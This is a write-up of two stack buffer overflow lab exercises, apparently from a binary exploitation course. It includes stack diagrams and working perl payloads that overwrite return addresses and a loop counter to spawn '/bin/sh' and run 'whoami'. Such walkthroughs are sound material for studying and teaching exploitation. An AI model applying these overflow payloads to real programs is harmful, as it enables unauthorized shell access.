**LAB2B:**
```bash
+===============+
|_____argv______|
|_____argc______|
|_____ret_______|
|____oldebp_____|<- ebp_main
|               |
|               |
|_______________|(pointer to '/bin/sh')
|__p_to_string__|
|_____ret_______|
|___ebp_main____|<- ebp_print_name
|               |
|               |
|_______________|
|__p_to_string__|
|_____dest______|(ebp_print_name-0x17)
```
<!--more-->
Now, it's clear, we just need 0x17 bytes to override until `ebp_print_name`, then 4 bytes to override `ebp_print_name`, then 4 bytes to override `ret`, we can redirect `ret` to function `shell`.  
After returning from `print_name`, `esp` will point to `p_to_string`, since function `shell` use `ebp-0x8` as argument, so we need put pointer to '/bin/sh' into somewhere 4 bytes after `p_to_string`.
```bash
$ ./lab2B $( perl -e 'print "A"x27 . "\xbd\x86\x04\x08" . "\xd0\x87\x04\x08"x2' )
```
**LAB2A:**
```bash
+===============+
|______ret______|
|____old_ebp____|<- ebp_c
|               |
|               |
|_______________|<- ebp_c - 0x14
|_ebp_c_-_0x14__|<- ebp_c - 0x18
|_______i_______|
|               |
|               |
|               |
|_______________|<- ebp_c - 0x28
|_______________|
|_______________|
|_____0x10______|<- 'size' argument in fgets(), means 15 chars at most.
|_ebp_c_-_0x28__|
```
`i` is a counter, starts from `0x0` to `0x9`, everytime fgets() reads a string to `ebp_c - 0x28`, `i` increases by 1, then one character is taken to `ebp_c - 0x14`.  
Since there are 12 bytes between `ebp_c - 0x28` and i, but fgets() can at most read 15 characters, so we can override i, by that `ret` will also be modified.
```bash
$ for i in $( seq 1 24 ); do perl -e 'print "a" x 12 . "\x0a"'; done > /tmp/abc
$ perl -e 'print "\xfd" x 12 . "\x0a"' >> /tmp/abc
$ perl -e 'print "\x86" x 12 . "\x0a"' >> /tmp/abc
$ perl -e 'print "\x04" x 12 . "\x0a"' >> /tmp/abc
$ perl -e 'print "\x08" x 12 . "\x0a"' >> /tmp/abc
$ perl -e 'print "a" x 11 . "\x0a"' >> /tmp/abc
$ for i in $( seq 1 10 ); do perl -e 'print "a" x 10 . "\x0a"'; done >> /tmp/abc
$ { cat /tmp/abc; echo "whoami"; } | ./lab2A
```
**NOTICE:**
+ `\x0a` also is `\n`.  
+ In both cases, we expect to run `system('/bin/sh')`, but there're tiny differences between LAB2B and LAB2A.  
  In LAB2B you will finally get an interactive shell, because new shell will inherit standard input as it's input.  
  In LAB2A new shell is connected to a pipe(buffer), when left command-list finished there will be an `EOF` and pipe will be closed so does the new shell. So we need to override `i` back to 0(NULL, fgets() can do it), to make sure fgets() read enough data and finish properly, in the end `whoami` will not be swallowed but redirected to the new shell.
